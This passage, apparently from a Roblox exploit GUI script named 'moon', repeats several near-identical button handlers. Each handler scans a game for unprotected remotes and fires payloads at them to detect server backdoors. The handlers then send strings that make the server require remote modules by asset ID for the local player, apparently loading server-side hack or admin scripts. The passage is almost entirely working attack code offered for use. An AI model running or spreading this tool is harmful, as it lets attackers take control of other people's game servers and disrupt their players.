		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_3a);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_41()
	local script = G2L["41"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(5115249013).fehack(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_48()
	local script = G2L["48"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(14572394952)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_48);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_4f()
	local script = G2L["4f"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(0x1767bf813)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_4f);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_56()
	local script = G2L["56"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4869378421).F3X(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_56);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_5d()
	local script = G2L["5d"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6056559552).load(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_5d);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_64()
	local script = G2L["64"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}


		local player = game.Players.LocalPlayer
		local payloading = [[require(6168743245).load(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_64);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_6b()
	local script = G2L["6b"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7804327506).amigodogodenot123(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_6b);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_71()
	local script = G2L["71"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
